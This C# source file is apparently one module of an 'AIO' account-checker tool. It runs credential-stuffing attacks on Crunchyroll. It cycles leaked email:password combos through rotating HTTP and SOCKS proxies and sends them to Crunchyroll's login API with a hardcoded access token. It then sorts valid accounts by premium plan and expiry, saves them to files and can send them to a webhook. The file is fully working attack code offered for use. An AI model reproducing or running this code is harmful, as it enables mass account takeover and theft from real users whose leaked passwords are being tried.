using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Crunchyrollmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)";
                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req.Post("https://api.crunchyroll.com/start_session.0.json",
                                "device_type=com.crunchyroll.windows.desktop&device_id=<guid>&access_token=LNDJgOit5yaRIWN",
                                "application/x-www-form-urlencoded").ToString();
                            var sessionid = Regex.Match(text2, "\"session_id\":\"(.*?)\"").Groups[1].Value;
                            var text3 = req.Post("https://api.crunchyroll.com/login.0.json",
                                "account=" + array[0] + "&password=" + array[1] + "&session_id=" + sessionid +
                                "&locale=enUS&version=1.3.1.0&connectivity_type=wifi",
                                "application/x-www-form-urlencoded").ToString();
                            var flag12 = text3.Contains("premium\":\"\",\"");
                            if (flag12)
                            {
                                Program.Frees++;
                                Program.TotalChecks++;
                                Export.AsResult("/Crunchyroll_frees", array[0] + ":" + array[1]);
                            }
                            else
                            {
                                var flag9 = text3.Contains("Incorrect login information");
                                if (flag9)
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }

                                var flag7 = text3.Contains("premium\":\"");
                                if (flag7)
                                {
                                    var Plan = Parse(text3, "premium\":\"", "\",\"");
                                    var Expiry = Parse(text3, "expires\":\"", "T");
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Crunchyroll_hits",
                                        array[0] + ":" + array[1] + " | Expiry: " + Expiry + " | Plan: " + Plan);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Crunchyroll", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(
                                            array[0] + ":" + array[1] + " | Expiry: " + Expiry + " | Plan: " + Plan,
                                            "Crunchyroll Hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}